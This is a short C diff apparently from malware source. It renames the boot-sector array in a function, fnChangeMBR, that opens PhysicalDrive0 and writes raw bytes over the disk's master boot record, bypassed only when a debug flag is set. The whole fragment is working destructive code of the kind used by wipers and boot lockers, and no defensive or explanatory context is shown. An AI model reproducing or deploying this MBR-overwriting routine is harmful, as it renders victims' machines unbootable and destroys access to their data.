@@ -5,8 +5,8 @@ VOID WINAPI fnChangeMBR(VOID) {
 	if(g_bDebug == TRUE)
 		return;
 
-	DWORD dwToWrite = sizeof(g_adwBootSector) / sizeof(g_adwBootSector[0]);
-	DWORD dwWritten = sizeof(g_adwBootSector) / sizeof(g_adwBootSector[0]);
+	DWORD dwToWrite = sizeof(g_asBootSector) / sizeof(g_asBootSector[0]);
+	DWORD dwWritten = sizeof(g_asBootSector) / sizeof(g_asBootSector[0]);
 
 	HANDLE hFile = CreateFileW(
 		TEXT("\\\\.\\PhysicalDrive0\0"), 
@@ -21,7 +21,7 @@ VOID WINAPI fnChangeMBR(VOID) {
 
 	if (hFile !=NULL && WriteFile(
 		hFile,
-		g_adwBootSector,
+		g_asBootSector,
 		dwToWrite,
 		&dwWritten,
 		NULL))
